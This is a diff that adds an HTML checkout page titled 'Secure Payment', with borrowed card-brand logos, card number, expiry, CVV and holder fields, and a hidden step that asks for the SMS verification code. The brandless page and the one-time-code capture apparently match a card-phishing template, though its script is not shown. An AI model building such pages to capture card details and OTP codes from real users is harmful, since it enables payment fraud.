@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/7/7e/Samsung_Pay_icon.svg" type="image/x-icon">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="payment-container">
+        <h1>Secure Payment</h1>
+        <p>Complete your purchase securely</p>
+
+        <!-- Payment Methods -->
+        <div class="payment-methods">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="MasterCard">
+            <img src="https://cdn.freelogovectors.net/wp-content/uploads/2023/05/american-express-logo-freelogovectors.net_-1.png" alt="Amex">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" alt="Discover">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal">
+        </div>
+
+        <!-- Payment Form -->
+        <form id="payment-form">
+            <div class="form-group">
+                <label for="card-number">Card Number</label>
+                <div class="input-icon">
+                    <i class="fas fa-credit-card"></i>
+                    <input type="tel" id="card-number" name="card-number" inputmode="numeric" maxlength="19" placeholder="1234 5678 9012 3456" required>
+                    <div id="card-logo"></div> <!-- Card logo will appear here -->
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="expiry-date">Expiry Date</label>
+                <div class="input-icon">
+                    <i class="fas fa-calendar-alt"></i>
+                    <input type="tel" id="expiry-date" name="expiry-date" inputmode="numeric" maxlength="5" placeholder="MM/YY" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="cvv">CVV</label>
+                <div class="input-icon">
+                    <i class="fas fa-lock"></i>
+                    <input type="tel" id="cvv" name="cvv" inputmode="numeric" maxlength="3" placeholder="123" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="card-holder">Card Holder Name</label>
+                <div class="input-icon">
+                    <i class="fas fa-user"></i>
+                    <input type="text" id="card-holder" name="card-holder" placeholder="John Doe" required>
+                </div>
+            </div>
+            <button type="submit" class="submit-btn" id="pay-now-btn">
+                <span id="btn-text">Pay Now</span>
+                <span id="loading-spinner" class="hidden">
+                    <i class="fas fa-spinner fa-spin"></i> <!-- Loading spinner -->
+                </span>
+            </button>
+        </form>
+
+        <!-- SMS Verification Section (Hidden by Default) -->
+        <div id="sms-verification" class="hidden">
+            <h2>Verify Your Payment</h2>
+            <p>We’ve sent a verification code to your phone. Please enter it below:</p>
+            <div class="form-group">
+                <label for="sms-code">Verification Code</label>
+                <input type="text" id="sms-code" name="sms-code" inputmode="numeric" maxlength="6" placeholder="123456" required>
+            </div>
+             <!-- شاشة التحميل -->
+    <div id="verify-spinner" class="verify-spinner">
+        <div class="spinner"></div>
+        <p>جاري التحقق... الرجاء الانتظار (10 ثانية)</p>
+        <button class="cancel-btn" onclick="hideSpinner()">إلغاء</button>
+    </div>
+            <button type="button" class="submit-btn" id="verify-btn">Verify</button>
+        </div>
+
+        <!-- Trust Badges -->
+        <div class="trust-badges">
+            <div class="trust-item">
+                <i class="fas fa-shield-alt"></i>
+                <span>100% Secure Payment</span>
+            </div>
+            <div class="trust-item">
+                <i class="fas fa-lock"></i>
+                <span>SSL Encrypted</span>
+            </div>
+            <div class="trust-item">
+                <i class="fas fa-check-circle"></i>
+                <span>Trusted by Millions</span>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
